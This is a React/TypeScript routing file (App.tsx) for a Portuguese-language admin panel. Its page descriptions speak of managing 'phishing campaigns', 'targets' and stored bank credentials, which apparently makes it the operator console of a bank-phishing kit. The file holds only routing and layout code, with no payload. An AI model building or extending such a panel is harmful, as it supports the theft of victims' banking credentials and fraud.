import { Switch, Route } from "wouter";
import { queryClient } from "./lib/queryClient";
import { QueryClientProvider } from "@tanstack/react-query";
import { Toaster } from "@/components/ui/toaster";
import { TooltipProvider } from "@/components/ui/tooltip";
import { useAuth } from "./hooks/use-auth";
import ProtectedRoute from "./components/auth/ProtectedRoute";
import Sidebar from "./components/layout/Sidebar";
import Header from "./components/layout/Header";

// Pages
import LoginPage from "./pages/login";
import DashboardPage from "./pages/dashboard";
import UsersPage from "./pages/users";
import UserProfilePage from "./pages/user-profile";
import TargetsPage from "./pages/targets";
import BanksPage from "./pages/banks";
import VerificationPage from "./pages/verification";
import NotFound from "./pages/not-found";

const pageConfig = {
  "/dashboard": {
    component: DashboardPage,
    title: "Dashboard",
    description: "Gerencie suas campanhas de phishing com controle total",
  },
  "/users": {
    component: UsersPage,
    title: "Gerenciamento de Usuários",
    description: "Visualize e gerencie todos os usuários do sistema",
  },
  "/user-profile": {
    component: UserProfilePage,
    title: "Perfil do Usuário",
    description: "Gerencie suas informações pessoais com controle total e segurança avançada",
  },
  "/targets": {
    component: TargetsPage,
    title: "Central de Targets",
    description: "Gerencie e monitore seus targets com máxima eficiência",
  },
  "/banks": {
    component: BanksPage,
    title: "Informações Bancárias",
    description: "Gerencie as credenciais bancárias com segurança",
  },
  "/verification": {
    component: VerificationPage,
    title: "Sistema de Verificação",
    description: "Aprove ou rejeite verificações de usuários",
  },
};

function ProtectedLayout({ children, title, description }: { children: React.ReactNode; title: string; description: string }) {
  return (
    <ProtectedRoute>
      <div className="flex min-h-screen gradient-bg">
        <Sidebar />
        <div className="flex-1 overflow-auto">
          <Header title={title} description={description} />
          <main className="p-6">{children}</main>
        </div>
      </div>
    </ProtectedRoute>
  );
}

function Router() {
  const { isAuthenticated } = useAuth();

  return (
    <Switch>
      <Route path="/login" component={LoginPage} />
      
      {Object.entries(pageConfig).map(([path, config]) => (
        <Route key={path} path={path}>
          <ProtectedLayout title={config.title} description={config.description}>
            <config.component />
          </ProtectedLayout>
        </Route>
      ))}

      <Route path="/">
        {isAuthenticated ? (
          <ProtectedLayout title="Dashboard" description="Gerencie suas campanhas de phishing com controle total">
            <DashboardPage />
          </ProtectedLayout>
        ) : (
          <LoginPage />
        )}
      </Route>

      <Route component={NotFound} />
    </Switch>
  );
}

function App() {
  return (
    <QueryClientProvider client={queryClient}>
      <TooltipProvider>
        <div className="dark">
          <Toaster />
          <Router />
        </div>
      </TooltipProvider>
    </QueryClientProvider>
  );
}

export default App;
